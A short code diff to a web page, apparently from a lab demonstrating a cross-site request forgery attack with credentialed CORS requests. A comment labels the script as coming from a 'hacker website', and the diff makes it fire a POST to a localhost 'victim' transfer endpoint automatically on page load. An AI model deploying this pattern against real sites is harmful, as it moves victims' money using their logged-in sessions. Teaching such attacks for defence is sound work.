@@ -36,7 +36,7 @@
 
 <script type="text/javascript">
     function transferAmount() {
-        $.ajax({
+        $.ajax({ //  this js is loaded from :9999 (hacker website)
             url:"http://localhost:8080/api/victim/transfer-rest",
             method: "POST",
             xhrFields: { withCredentials: true }, // CORS sending credentials
@@ -54,6 +54,8 @@
             }
         });
     }
+
+    transferAmount();
 
     $.ajax("http://localhost:8080/rest/user/current", {
         method: "GET",
